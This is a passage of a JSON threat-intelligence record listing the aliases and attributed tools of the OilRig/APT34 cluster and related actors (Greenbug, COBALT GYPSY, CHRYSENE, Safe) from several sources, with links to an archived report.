            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6bba8e81-73af-4010-86dc-d43c408ca342",
            "created_at": "2023-01-06T13:46:38.553459Z",
            "updated_at": "2025-03-27T02:00:02.860364Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [],
            "source_name": "MISPGALAXY:Greenbug",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "25896473-161f-411f-b76a-f11bb26c96bd",
            "created_at": "2023-01-06T13:46:38.75749Z",
            "updated_at": "2025-03-27T02:00:02.910627Z",
            "deleted_at": null,
            "main_name": "CHRYSENE",
            "aliases": [
                "Greenbug"
            ],
            "source_name": "MISPGALAXY:CHRYSENE",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535901,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1653698165,
    "ts_modification_date": 1653698165,
    "files": {
        "pdf": "https://archive.orkl.eu/1cb0f20795b750eca1b278b65e0cdd946b304f8f.pdf",
        "text": "https://archive.orkl.eu/1cb0f20795b750eca1b278b65e0cdd946b304f8f.txt",
        "img": "https://archive.orkl.eu/1cb0f20795b750eca1b278b65e0cdd946b304f8f.jpg"
    }
}